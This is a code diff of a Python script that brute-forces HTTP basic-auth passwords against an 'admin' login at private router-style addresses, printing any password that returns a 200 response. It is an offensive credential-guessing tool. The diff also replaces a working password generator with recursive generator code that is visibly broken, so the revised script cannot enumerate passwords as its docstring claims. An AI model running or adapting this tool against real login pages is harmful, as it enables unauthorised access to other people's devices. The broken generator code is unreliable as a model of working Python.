@@ -3,34 +3,28 @@ from time import sleep
 from itertools import combinations
 from typing import Generator, Union
 
+def ree(max=3, cur=[], start=32, end=127, index=0):
+    if len(cur) == max: return "finished"
+    else: cur = [start] ## First init
+    if cur[index] == end: 
+        cur.append(start)
+        yield cur
+        index += 1
+        ree(max, cur, start, end, index)
+    else:
+        yield cur
+        cur[index] += 1
+        ree(max, cur, start, end, index)
 
-def pwd_gen(pwd_len: int = 2, text_output: bool = True) -> Union[Generator, str]:
-    """Simple brute force pwd generator.
+def pwd_gen(pwd_len: int = 2, current_iter: list = [], chars: Generator = [chr(c) for c in range(32,127)]) -> list:
 
-    Generates ascending list of ASCII extended set passwords start from size ''->len(N).
-
-    Start generating passwords from nothing Eg '' to going through 95 chars of the
-    Extended ASCII char set. starting at 1 char and building upto the pwd_len.
-    Starting at 1 default is 2.
-
-    Args:
-        pwd_len (int): -> Defaults to 2.
-            The maximum size of the password you want to brute force
-        text_output (bool): -> Defaults to true.
-            Sets weather you want tuples to be returned or string
-    Returns:
-        each_combo (Generator | Str): This returns the current iteration of pwd.
-    """
     yield '' ##Check if pwd is nothing
-    chars = [chr(c) for c in range(32,127)] ##Extended ASCII set
-    for i in range(pwd_len):
-        for each_combo in combinations(chars, i+1):
-            if text_output:
-                yield ''.join(each_combo)
-            else:
-                yield each_combo
+    if pwd_len == len(current_iter):
+        return
+    else:
+        current_iter.append(0) 
 
-def atk(url: str = "", user: str = "admin", limit: Union[int, float] = 0.2) -> None:
+def atk(url: str = "", user: str = "admin", limit: Union[int, float] = 0.2, pwd_len: int = 2) -> None:
     """Guesses passwords for a given URL
 
     Args:
@@ -44,14 +38,17 @@ def atk(url: str = "", user: str = "admin", limit: Union[int, float] = 0.2) -> N
     Returns:
         None -> prints any 200 reponse and the given pwd to terminal
     """
-    for attempt_number, pwd_guess in enumerate(pwd_gen(pwd_len=2)):
+    for attempt_number, pwd_guess in enumerate(pwd_gen(pwd_len)):
         res = requests.get(url, auth=("admin", pwd_guess))
         if res.status_code == 200:
             print("Got 200 reponse on pwd: {}".format(pwd_guess))
+            exit()
         if res.status_code != 401:
             print("Got status code of: {}".format(res.status_code))
         print("Attempt #{} Pwd -> {} Got status: {}".format(attempt_number, pwd_guess, res.status_code))
         sleep(limit)
 
 
-atk(url="http://192.168.1.1/admin/", user="admin", limit=0.3)
+#atk(url="http://192.168.2.33/admin/", user="admin", limit=0.3, pwd_len=12)
+
+ree()
